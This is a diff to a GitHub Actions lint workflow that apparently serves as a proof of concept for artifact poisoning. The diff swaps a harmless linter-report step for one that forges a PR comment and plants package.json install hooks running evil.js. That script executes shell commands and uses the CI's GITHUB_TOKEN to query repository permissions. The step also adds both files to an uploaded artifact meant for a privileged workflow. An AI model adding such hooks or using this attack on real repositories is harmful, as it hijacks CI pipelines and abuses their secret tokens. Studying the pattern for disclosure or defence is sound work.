@@ -11,18 +11,41 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Write linter report
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
+      - name: Build attacker artifact for the privileged workflow
         run: |
-          printf 'No issues found.\n' > linter-report.txt
-          echo "$PR_NUMBER" > pr-number.txt
+          printf 'FORGED REPORT posted on an arbitrary PR\n' > linter-report.txt
+          printf '1' > pr-number.txt
+          cat > package.json <<'EOF'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": {
+              "preinstall": "node evil.js",
+              "postinstall": "node evil.js"
+            }
+          }
+          EOF
+          cat > evil.js <<'EOF'
+          const { execSync } = require('child_process');
+          console.log('RCE-PROOF id=' + execSync('id').toString().trim());
+          (async () => {
+            const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, {
+              headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'user-agent': 'poc' }
+            });
+            const j = await r.json();
+            console.log('RCE-TOKEN-API full_name=' + j.full_name + ' permissions=' + JSON.stringify(j.permissions));
+          })().catch(e => console.log('ERR ' + e.message));
+          EOF
 
-      - name: Upload linter report
+      - name: Upload artifact with attacker-chosen files
+        if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
+            package.json
+            evil.js
             linter-report.txt
             pr-number.txt
           if-no-files-found: ignore
